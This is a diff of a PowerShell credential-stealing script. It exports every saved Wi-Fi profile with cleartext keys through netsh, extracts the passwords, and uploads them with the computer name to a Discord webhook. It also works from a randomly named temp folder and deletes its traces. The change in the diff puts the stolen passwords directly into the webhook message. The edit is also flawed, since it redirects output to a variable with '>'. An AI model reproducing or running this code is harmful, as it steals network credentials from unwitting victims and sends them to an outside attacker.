@@ -24,7 +24,7 @@ param (
 
 $building =  [PSCustomObject]@{
     'title'       = 'Incoming transmission!'
-    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting:'
+    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting:' + [string]$loggedwifis
     'color'       = '16744960'
 }
 
@@ -45,7 +45,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUr
 function Wifi {
 New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
 Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
-Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
+Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $loggedwifis
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
